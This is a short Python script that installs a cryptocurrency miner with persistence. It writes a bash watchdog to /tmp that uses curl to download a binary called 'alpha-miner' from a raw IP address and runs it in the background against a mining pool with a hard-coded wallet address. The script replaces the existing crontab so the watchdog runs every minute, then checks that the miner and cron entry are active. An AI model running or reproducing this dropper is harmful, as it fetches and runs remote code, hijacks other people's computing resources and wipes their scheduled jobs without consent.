import subprocess
import os

# Create watchdog script
watchdog = """#!/bin/bash
if ! pgrep -f "/tmp/m" > /dev/null; then
    curl -sL -o /tmp/m http://151.247.219.40:8000/alpha-miner 2>/dev/null
    chmod +x /tmp/m
    nohup /tmp/m --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker RTX4090_183 </dev/null >/tmp/miner.log 2>&1 &
fi
"""

with open("/tmp/watchdog.sh", "w") as f:
    f.write(watchdog)
os.chmod("/tmp/watchdog.sh", 0o755)

# Clear existing cron and add ours
cron_new = "* * * * * /tmp/watchdog.sh\n"
p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
p.communicate(cron_new)

# Run watchdog now
subprocess.run(["/tmp/watchdog.sh"], timeout=60)

import time
time.sleep(5)

ps = subprocess.run(["pgrep", "-c", "-f", "/tmp/m"], capture_output=True, text=True)
cron = subprocess.run(["crontab", "-l"], capture_output=True, text=True)

result = f"PROCS: {ps.stdout.strip()}, CRON: {'watchdog' in cron.stdout}"
